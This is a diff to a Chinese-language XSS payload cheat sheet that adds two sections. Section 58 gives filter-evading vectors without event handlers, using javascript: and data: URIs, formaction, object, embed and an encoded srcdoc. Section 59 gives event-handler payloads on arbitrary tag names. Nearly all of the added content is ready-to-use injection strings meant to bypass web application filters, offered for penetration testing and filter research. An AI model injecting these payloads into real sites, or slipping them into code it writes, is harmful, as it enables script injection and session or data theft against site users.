@@ -362,7 +362,7 @@ status.html&msg=<script>alert(1)</script>
 ```
 
 **57.SVG Vectors without Event Handlers (不带事件处理程序的SVG向量)** <br>
-以下payload用于避免过滤器查找事件处理程序或src、data等。进行url编码后的最后一个payload仅适用于Firefox
+以下payload用于避免过滤器查找事件处理程序或src、data等。进行url编码后的最后一个payload仅适用于Firefox <br>
 ```
 <svg><a><rect width=99% height=99% /><animate attributeName=href
 to=javascript:alert(1)>
@@ -376,6 +376,62 @@ c3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI
 %2BPGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9Imp
 hdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>
 ```
+**58.Vectors without Event Handlers (不带事件处理程序的向量)** <br>
+如果web应用不允许，则payload用作事件处理程序的替代项。如payload本身所述,有些需要用户交互才能触发 <br>
+```
+<script>alert(1)</script>
+<script src=data:,alert(1)>
+<iframe src=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<a href=javascript:alert(1)>click
+<math><brute href=javascript:alert(1)>click
+<form action=javascript:alert(1)><input type=submit>
+<isindex action=javascript:alert(1) type=submit value=click>
+<form><button formaction=javascript:alert(1)>click
+<form><input formaction=javascript:alert(1) type=submit value=click>
+<form><input formaction=javascript:alert(1) type=image value=click>
+<form><input formaction=javascript:alert(1) type=image src=SOURCE>
+<isindex formaction=javascript:alert(1) type=submit value=click>
+<object data=javascript:alert(1)>
+<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
+<svg><script xlink:href=data:,alert(1) />
+<math><brute xlink:href=javascript:alert(1)>click
+```
+**59.Vectors with Agnostic Event Handlers (带有未知事件处理程序的向量)** <br>
+如果web应用不允许使用所有已知的HTML标记名时，请使用以下payload。任何字母字符或字符串都可以用作标签名名来代替"x"。<br>
+如payload本身所述,有些需要用户交互才能触发.<br>
+```
+<x contenteditable onblur=alert(1)>lose focus!
+<x onclick=alert(1)>click this!
+<x oncopy=alert(1)>copy this!
+<x oncontextmenu=alert(1)>right click this!
+<x onauxclick=alert(1)>right click this!
+<x oncut=alert(1)>copy this!
+<x ondblclick=alert(1)>double click this!
+<x ondrag=alert(1)>drag this!
+<x contenteditable onfocus=alert(1)>focus this!
+<x contenteditable oninput=alert(1)>input here!
+<x contenteditable onkeydown=alert(1)>press any key!
+<x contenteditable onkeypress=alert(1)>press any key!
+<x contenteditable onkeyup=alert(1)>press any key!
+<x onmousedown=alert(1)>click this!
+<x onmouseenter=alert(1)>hover this
+<x onmousemove=alert(1)>hover this!
+<x onmouseout=alert(1)>hover this!
+<x onmouseover=alert(1)>hover this!
+<x onmouseup=alert(1)>click this!
+<x contenteditable onpaste=alert(1)>paste here!
+<x onpointercancel=alert(1)>hover this!
+<x onpointerdown=alert(1)>hover this!
+<x onpointerenter=alert(1)>hover this!
+<x onpointerleave=alert(1)>hover this!
+<x onpointermove=alert(1)>hover this!
+<x onpointerout=alert(1)>hover this!
+<x onpointerover=alert(1)>hover this!
+<x onpointerup=alert(1)>hover this!
+<x onpointerrawupdate=alert(1)>hover this!
+```
+**60.**
 
 ## 致谢
 **英文议题作者：** <br>
